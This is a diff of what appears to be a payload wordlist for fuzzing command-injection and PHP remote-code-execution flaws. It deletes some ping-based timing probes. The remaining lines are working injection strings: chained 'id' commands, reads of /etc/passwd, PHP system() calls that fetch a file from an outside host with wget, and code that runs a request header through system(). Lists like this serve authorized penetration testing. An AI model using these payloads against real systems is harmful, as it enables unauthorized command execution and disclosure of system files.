@@ -59,10 +59,6 @@ a|/usr/bin/id
 %0Aid
 %0A/usr/bin/id%0A
 %0Aid%0A
-& ping -i 30 127.0.0.1 &
-& ping -n 30 127.0.0.1 &
-%0a ping -i 30 127.0.0.1 %0a
-`ping 127.0.0.1`
 | id
 & id
 ; id
@@ -112,14 +108,11 @@ system('cat /etc/passwd');
 && 
 %0a
 %0a%0d
-
 %0Aid
 %0a id %0a
 %0Aid%0A
-%0a ping -i 30 127.0.0.1 %0a
 %0A/usr/bin/id
 %0A/usr/bin/id%0A
-%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
 %20{${phpinfo()}}
 %20{${sleep(20)}}
 %20{${sleep(3)}}
@@ -348,9 +341,6 @@ phpinfo();
 <?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
 <?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc");?>
 :phpversion();
-`ping 127.0.0.1`
-& ping -i 30 127.0.0.1 &
-& ping -n 30 127.0.0.1 &
 ;${@print(md5(RCEVulnerable))};
 ${@print("RCEVulnerable")}
 ${@print(system($_SERVER['HTTP_USER_AGENT']))}
